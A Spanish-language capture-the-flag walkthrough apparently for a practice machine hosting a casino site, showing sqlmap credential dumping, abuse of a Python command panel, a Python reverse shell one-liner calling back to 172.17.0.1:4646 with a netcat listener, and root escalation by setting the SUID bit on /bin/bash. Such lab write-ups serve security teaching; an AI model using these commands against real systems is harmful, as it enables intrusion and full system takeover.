Lo primero es hacer un escaneo de puertos y servicios con nmap.

![Pasted image 20240810013800](https://github.com/user-attachments/assets/17a126d0-bc5c-49fa-a2b1-1b68eddbe7dc)

Accedo al recurso, es una página de un casino, voy a la opción de Login y me encuentro un formulario.

![Pasted image 20240810014001](https://github.com/user-attachments/assets/a4d4d8e9-e5a0-456d-8985-9b96aa582494)

Intento iniciar con unas credenciales admin admin para ver si puedo entrar.

![Pasted image 20240810014111](https://github.com/user-attachments/assets/fac9ebe9-a36d-452c-a459-d630ae0dbc6a)

Voy a realizar un poco de fuzzing web con gobuster.

![Pasted image 20240810020742](https://github.com/user-attachments/assets/3583c750-1e7a-43d0-a3d6-d132f4256aad)

No encuentro nada útil asique voy a intentar obtener la base de datos con sqlmap.

![Pasted image 20240810021003](https://github.com/user-attachments/assets/2c958972-ddaf-4bf7-ad37-8017e4a8e891)

Primero voy a intentar obtener las bases de datos.

![Pasted image 20240810021037](https://github.com/user-attachments/assets/1b140f2b-1d01-4895-b922-4e76e76db49a)

Ahora voy a intentar obtener las tablas de la base de datos users.

![Pasted image 20240810021131](https://github.com/user-attachments/assets/7a3c924e-1eea-4aa5-8617-f192ee986bb3)

![Pasted image 20240810021143](https://github.com/user-attachments/assets/50d5185f-6922-4bee-b511-946b75efe007)

Lo siguiente es obtener las columnas de la tabla usuarios.

![Pasted image 20240810021410](https://github.com/user-attachments/assets/86969d70-ea9f-483d-b768-1684a2b9131a)

![Pasted image 20240810021417](https://github.com/user-attachments/assets/8d82257b-d6bf-426e-b4e6-7a0fe2f092bc)

Para ver el contenido de las columnas.

![Pasted image 20240810021527](https://github.com/user-attachments/assets/af11651c-f4ec-4e99-8e13-b2da3b9ee6b0)

![Pasted image 20240810021533](https://github.com/user-attachments/assets/8ff9d58b-8cd4-4b89-986a-f1c88992f7bb)

Voy al formulario e inicio sesión como el usuario joe con la password MiClaveEsInhackeable.

![Pasted image 20240810021651](https://github.com/user-attachments/assets/89b2305c-51d8-46e0-8aee-4793a850780b)

Encuentro un panel de administración, lo que me hace pensar que joe es un administrador.

Veo que me pide que introduzca un comando Python.

Puedo leer archivos como el de los usuarios de la máquina.

![Pasted image 20240810022150](https://github.com/user-attachments/assets/ce850e58-2493-4345-845b-7fb79ba72f09)

Voy a intentar ejecutar una reverse shell para conseguir acceso al sistema.

Primero me pongo en escucha por el puerto 4646 utilizando netcat.

```
nc -lvnp 4646
```

Y luego ejecuto el comando.

![Pasted image 20240810023548](https://github.com/user-attachments/assets/652d2843-4389-4a7b-aef7-045c765b25fd)

```
import os,pty,socket;s=socket.socket();s.connect(("172.17.0.1",4646));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

Ahora haré el tratamiento de la TTY.

```bash
script /dev/null -c bash
Control + Z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Voy a ver si hay algún archivo en el directorio /tmp que son archivos temporales.

![Pasted image 20240810024550](https://github.com/user-attachments/assets/80d6c07c-93cd-434b-8b00-c43450d2ca61)

Veo un archivo txt oculto, listo su contenido y son diferentes comandos de trucos del videojuego gta san andreas.

Lo importante es que hay un nuevo posible usuario llamado Martin, pero este usuario no se encuentra en el archivo /etc/passwd como vi anteriormente cuando lo listé desde el panel del administrador.

Voy a ver si puede ser posible que la contraseña de Joe o Luciano se encuentre en este .txt por lo que me lo voy a copiar y además como todas están en mayúsculas, voy a crear el mismo fichero pero con todas minúsculas.

En el archivo passwd.txt guardo las passwords en mayúsculas y en el passwd2.txt las minúsculas. 

![Pasted image 20240810025816](https://github.com/user-attachments/assets/d00172d2-e66a-4dce-a525-f52e06c32473)

Con el archivo con las contraseñas en mayúsculas no consigo nada sin embargo con el de las minúsculas y el usuario joe consigo las credenciales para acceder por ssh a la máquina.

![Pasted image 20240810030103](https://github.com/user-attachments/assets/8536ac57-7597-4b59-bf5d-e593b3550aba)

Inicio sesión en ssh como joe.

![Pasted image 20240810030124](https://github.com/user-attachments/assets/e6be355a-8740-4fec-994e-c88ac5f69e60)

Voy a intentar escalar privilegios.

Consigo ser el usuario Luciano gracias al siguiente binario.

![Pasted image 20240810030452](https://github.com/user-attachments/assets/7388bfdb-8fbd-45eb-a5d2-4ac4bed4cbaa)

En el directorio de Luciano, encuentro que puedo ejecutar como root un script.sh que me proporciona una reverse shell.

![Pasted image 20240810030632](https://github.com/user-attachments/assets/3aa57181-e88f-4611-8878-1ae9f8854295)

Tengo que cambiar el contenido para cambiar los permisos sobre el binario /bin/bash, pero antes un tratamiento de TTY.
```
script /dev/null -c bash
```

Ahora voy a modificar el contenido de la siguiente forma con el comando echo.

```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > script.sh
```
Para obtener una bash como root tengo que ejecutar el comando **bash -p**.

![Pasted image 20240810032612](https://github.com/user-attachments/assets/72ca43ba-b948-46c6-8354-f8f500cde388)
